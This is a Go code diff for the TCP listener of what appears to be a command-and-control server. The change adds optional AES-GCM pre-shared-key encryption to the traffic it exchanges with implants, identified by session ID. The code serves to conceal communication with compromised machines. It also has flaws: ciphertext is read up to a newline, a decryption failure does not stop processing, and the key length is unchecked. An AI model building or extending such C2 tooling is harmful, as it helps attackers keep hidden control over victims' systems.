@@ -2,9 +2,13 @@ package server
 
 import (
 	"bufio"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"strconv"
@@ -13,7 +17,7 @@ import (
 )
 
 // StartTCPServer - starts a tcp server with given parameters specified during Listener creation
-func StartTCPServer(tcpServer net.Listener) {
+func StartTCPServer(tcpServer net.Listener, cryptoPSK string) {
 	defer tcpServer.Close()
 
 	for {
@@ -27,7 +31,7 @@ func StartTCPServer(tcpServer net.Listener) {
 			continue
 		}
 		// Using a go routine to handle the connection
-		go TCPServerHandler(conn)
+		go TCPServerHandler(conn, cryptoPSK)
 	}
 }
 
@@ -59,7 +63,7 @@ func StartTCPServer(tcpServer net.Listener) {
 //
 // File - a string value that is expected to be a base64 encoded string that is a file to download or upload.
 
-func TCPServerHandler(conn net.Conn) {
+func TCPServerHandler(conn net.Conn, cryptoPSK string) {
 
 	defer conn.Close()
 
@@ -73,6 +77,22 @@ func TCPServerHandler(conn net.Conn) {
 	var additionalFunctions map[string]interface{}
 
 	netData, err := bufio.NewReader(conn).ReadString('\n')
+
+	if cryptoPSK != "" {
+
+		data := []byte(netData)
+		key := []byte(cryptoPSK)
+
+		plaintext, err := decrypt(data, key)
+		if err != nil {
+			errorString := "Error decrypting TCP connection data from implant claiming to be session: " + strconv.Itoa(tcpParams.SessionID)
+			core.LogData(errorString)
+			core.ErrorColorBold.Println(errorString)
+			fmt.Println(err)
+		}
+		netData = string(plaintext)
+	}
+
 	if err != nil {
 		errorString := "Error reading TCP connection from implant claiming to be session: " + strconv.Itoa(tcpParams.SessionID)
 		core.LogData(errorString)
@@ -209,6 +229,62 @@ func TCPServerHandler(conn net.Conn) {
 	core.UpdateImplant(tcpParams.SessionID, tcpParams.Update, additionalFunctions)
 	core.SessionCheckIn(tcpParams.SessionID)
 
-	conn.Write([]byte(jsonResp))
+	if cryptoPSK != "" {
 
+		key := []byte(cryptoPSK)
+		data := []byte(jsonResp)
+
+		ciphertext, err := encrypt(data, key)
+		if err != nil {
+			errorString := "Error encrypting TCP connection data for implant claiming to be session: " + strconv.Itoa(tcpParams.SessionID)
+			core.LogData(errorString)
+			core.ErrorColorBold.Println(errorString)
+			fmt.Println(err)
+		}
+		conn.Write([]byte(ciphertext))
+	} else {
+
+		conn.Write([]byte(jsonResp))
+
+	}
+
+}
+
+func encrypt(plaintext []byte, key []byte) ([]byte, error) {
+	c, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+
+	gcm, err := cipher.NewGCM(c)
+	if err != nil {
+		return nil, err
+	}
+
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
+		return nil, err
+	}
+
+	return gcm.Seal(nonce, nonce, plaintext, nil), nil
+}
+
+func decrypt(ciphertext []byte, key []byte) ([]byte, error) {
+	c, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+
+	gcm, err := cipher.NewGCM(c)
+	if err != nil {
+		return nil, err
+	}
+
+	nonceSize := gcm.NonceSize()
+	if len(ciphertext) < nonceSize {
+		return nil, errors.New("ciphertext too short")
+	}
+
+	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
+	return gcm.Open(nil, nonce, ciphertext, nil)
 }
